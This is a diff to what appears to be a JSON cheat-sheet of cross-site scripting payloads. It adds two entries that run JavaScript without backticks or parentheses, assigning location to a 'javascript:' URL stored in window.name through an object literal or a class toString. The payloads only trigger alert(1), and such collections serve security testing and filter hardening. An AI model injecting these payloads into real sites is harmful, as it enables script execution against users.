@@ -241,5 +241,25 @@
             "edge",
             "safari"
         ]
+    },
+    {
+        "description": "Avoiding Invalid left-hand side in assignment without  `, (), ?, [], or , using object literal",
+        "code": "<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+{a:location=name}+\"\")<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Avoiding Invalid left-hand side in assignment without  `, (), ?, [], or , using new class",
+        "code": "<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+new class b{toString=e=>location=name}+\"\")<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
     }
 ]
